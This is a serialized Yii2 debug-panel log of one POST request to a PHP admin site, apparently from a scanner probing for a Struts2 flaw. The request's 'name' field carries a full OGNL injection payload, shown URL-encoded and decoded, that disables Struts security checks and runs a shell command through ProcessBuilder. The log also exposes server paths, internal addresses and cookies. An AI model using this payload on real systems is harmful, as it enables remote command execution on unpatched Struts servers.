a:11:{s:6:"config";a:5:{s:10:"phpVersion";s:6:"7.0.21";s:10:"yiiVersion";s:6:"2.0.12";s:11:"application";a:8:{s:3:"yii";s:6:"2.0.12";s:4:"name";s:14:"My Application";s:7:"version";s:3:"1.0";s:8:"language";s:5:"zh-CN";s:14:"sourceLanguage";s:5:"en-US";s:7:"charset";s:5:"UTF-8";s:3:"env";s:3:"dev";s:5:"debug";b:1;}s:3:"php";a:5:{s:7:"version";s:6:"7.0.21";s:6:"xdebug";b:1;s:3:"apc";b:0;s:8:"memcache";b:0;s:9:"memcached";b:0;}s:10:"extensions";a:5:{s:22:"yiisoft/yii2-bootstrap";a:3:{s:4:"name";s:22:"yiisoft/yii2-bootstrap";s:7:"version";s:7:"2.0.6.0";s:5:"alias";a:1:{s:14:"@yii/bootstrap";s:49:"/var/www/xkkb_admin/vendor/yiisoft/yii2-bootstrap";}}s:18:"yiisoft/yii2-faker";a:3:{s:4:"name";s:18:"yiisoft/yii2-faker";s:7:"version";s:7:"2.0.3.0";s:5:"alias";a:1:{s:10:"@yii/faker";s:45:"/var/www/xkkb_admin/vendor/yiisoft/yii2-faker";}}s:16:"yiisoft/yii2-gii";a:3:{s:4:"name";s:16:"yiisoft/yii2-gii";s:7:"version";s:7:"2.0.5.0";s:5:"alias";a:1:{s:8:"@yii/gii";s:43:"/var/www/xkkb_admin/vendor/yiisoft/yii2-gii";}}s:24:"yiisoft/yii2-swiftmailer";a:3:{s:4:"name";s:24:"yiisoft/yii2-swiftmailer";s:7:"version";s:7:"2.0.7.0";s:5:"alias";a:1:{s:16:"@yii/swiftmailer";s:51:"/var/www/xkkb_admin/vendor/yiisoft/yii2-swiftmailer";}}s:18:"yiisoft/yii2-debug";a:3:{s:4:"name";s:18:"yiisoft/yii2-debug";s:7:"version";s:7:"2.0.9.0";s:5:"alias";a:1:{s:10:"@yii/debug";s:45:"/var/www/xkkb_admin/vendor/yiisoft/yii2-debug";}}}}s:7:"request";a:14:{s:7:"flashes";a:0:{}s:10:"statusCode";i:404;s:14:"requestHeaders";a:5:{s:10:"user-agent";s:17:"Python-urllib/2.6";s:10:"connection";s:5:"close";s:12:"content-type";s:33:"application/x-www-form-urlencoded";s:4:"host";s:15:"120.27.8.113:80";s:14:"content-length";s:4:"1261";}s:15:"responseHeaders";a:6:{s:12:"X-Powered-By";s:10:"PHP/7.0.21";s:10:"Set-Cookie";a:2:{i:0;s:54:"PHPSESSID=mhphbfmu2d3p8egjg9pobv8lf6; path=/; HttpOnly";i:1;s:259:"_csrf-backend=8fa83db95ca1940dfc7036a487b82ea478d4fc2cda18bbdc9b34760446fc2f0ea%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_csrf-backend%22%3Bi%3A1%3Bs%3A32%3A%22A%02%0F%A4W%92%B1%81%A4U%C8%AB%02%CD%05%25%9A%E0%98%25%ADVt%B03%2B%D0%12%17%AC%DA%93%22%3B%7D; path=/; HttpOnly";}s:7:"Expires";s:29:"Thu, 19 Nov 1981 08:52:00 GMT";s:13:"Cache-Control";s:35:"no-store, no-cache, must-revalidate";s:6:"Pragma";s:8:"no-cache";s:12:"Content-Type";s:24:"text/html; charset=UTF-8";}s:5:"route";s:11:"index/error";s:6:"action";s:26:"yii\web\ErrorAction::run()";s:12:"actionParams";a:0:{}s:11:"requestBody";a:3:{s:12:"Content Type";s:33:"application/x-www-form-urlencoded";s:3:"Raw";s:1261:"name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23a%3D12302938%29.%28%23b%3D3123812%2b%23a%29.%28%23cmd%3D%27%20echo%20aliyun_%27%2b%23a%2b%23b%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__checkbox_bustedBefore=true&description=32143";s:17:"Decoded to Params";a:4:{s:4:"name";s:853:"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#a=12302938).(#b=3123812+#a).(#cmd=' echo aliyun_'+#a+#b).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";s:3:"age";s:3:"123";s:23:"__checkbox_bustedBefore";s:4:"true";s:11:"description";s:5:"32143";}}s:6:"SERVER";a:30:{s:4:"USER";s:6:"apache";s:4:"HOME";s:16:"/usr/share/httpd";s:15:"HTTP_USER_AGENT";s:17:"Python-urllib/2.6";s:15:"HTTP_CONNECTION";s:5:"close";s:17:"HTTP_CONTENT_TYPE";s:33:"application/x-www-form-urlencoded";s:9:"HTTP_HOST";s:15:"120.27.8.113:80";s:19:"HTTP_CONTENT_LENGTH";s:4:"1261";s:15:"REDIRECT_STATUS";s:3:"200";s:11:"SERVER_NAME";s:17:"admin.xkkb.com.cn";s:11:"SERVER_PORT";s:2:"80";s:11:"SERVER_ADDR";s:14:"172.31.229.194";s:11:"REMOTE_PORT";s:4:"2487";s:11:"REMOTE_ADDR";s:15:"140.205.225.194";s:15:"SERVER_SOFTWARE";s:12:"nginx/1.12.1";s:17:"GATEWAY_INTERFACE";s:7:"CGI/1.1";s:14:"REQUEST_SCHEME";s:4:"http";s:15:"SERVER_PROTOCOL";s:8:"HTTP/1.0";s:13:"DOCUMENT_ROOT";s:19:"/var/www/xkkb_admin";s:12:"DOCUMENT_URI";s:10:"/admin.php";s:11:"REQUEST_URI";s:41:"/showcase/integration/saveGangster.action";s:11:"SCRIPT_NAME";s:10:"/admin.php";s:14:"CONTENT_LENGTH";s:4:"1261";s:12:"CONTENT_TYPE";s:33:"application/x-www-form-urlencoded";s:14:"REQUEST_METHOD";s:4:"POST";s:12:"QUERY_STRING";s:0:"";s:15:"SCRIPT_FILENAME";s:29:"/var/www/xkkb_admin/admin.php";s:9:"FCGI_ROLE";s:9:"RESPONDER";s:8:"PHP_SELF";s:10:"/admin.php";s:18:"REQUEST_TIME_FLOAT";d:1502949543.214921;s:12:"REQUEST_TIME";i:1502949543;}s:3:"GET";a:0:{}s:4:"POST";a:4:{s:4:"name";s:853:"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#a=12302938).(#b=3123812+#a).(#cmd=' echo aliyun_'+#a+#b).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";s:3:"age";s:3:"123";s:23:"__checkbox_bustedBefore";s:4:"true";s:11:"description";s:5:"32143";}s:6:"COOKIE";a:0:{}s:5:"FILES";a:0:{}s:7:"SESSION";a:1:{s:7:"__flash";a:0:{}}}s:3:"log";a:1:{s:8:"messages";a:18:{i:0;a:6:{i:0;s:33:"Bootstrap with yii\log\Dispatcher";i:1;i:8;i:2;s:31:"yii\base\Application::bootstrap";i:3;d:1502949543.2165461;i:4;a:0:{}i:5;i:860768;}i:1;a:6:{i:0;s:21:"Loading module: debug";i:1;i:8;i:2;s:26:"yii\base\Module::getModule";i:3;d:1502949543.2165771;i:4;a:0:{}i:5;i:862144;}i:2;a:6:{i:0;s:44:"Bootstrap with yii\debug\Module::bootstrap()";i:1;i:8;i:2;s:31:"yii\base\Application::bootstrap";i:3;d:1502949543.217237;i:4;a:0:{}i:5;i:992344;}i:3;a:6:{i:0;s:19:"Loading module: gii";i:1;i:8;i:2;s:26:"yii\base\Module::getModule";i:3;d:1502949543.2179019;i:4;a:0:{}i:5;i:1029736;}i:4;a:6:{i:0;s:42:"Bootstrap with yii\gii\Module::bootstrap()";i:1;i:8;i:2;s:31:"yii\base\Application::bootstrap";i:3;d:1502949543.217984;i:4;a:0:{}i:5;i:1035232;}i:12;a:6:{i:0;s:59:"Route requested: 'showcase/integration/saveGangster.action'";i:1;i:8;i:2;s:34:"yii\web\Application::handleRequest";i:3;d:1502949543.218492;i:4;a:0:{}i:5;i:1131408;}i:13;a:6:{i:0;s:854:"yii\base\InvalidRouteException: Unable to resolve the request "showcase/integration/saveGangster.action". in /var/www/xkkb_admin/vendor/yiisoft/yii2/base/Module.php:532
Stack trace:
#0 /var/www/xkkb_admin/vendor/yiisoft/yii2/web/Application.php(102): yii\base\Module->runAction('showcase/integr...', Array)
#1 /var/www/xkkb_admin/vendor/yiisoft/yii2/base/Application.php(380): yii\web\Application->handleRequest(Object(yii\web\Request))
#2 /var/www/xkkb_admin/admin.php(42): yii\base\Application->run()
#3 {main}

Next yii\web\NotFoundHttpException: 页面未找到。 in /var/www/xkkb_admin/vendor/yiisoft/yii2/web/Application.php:114
Stack trace:
#0 /var/www/xkkb_admin/vendor/yiisoft/yii2/base/Application.php(380): yii\web\Application->handleRequest(Object(yii\web\Request))
#1 /var/www/xkkb_admin/admin.php(42): yii\base\Application->run()
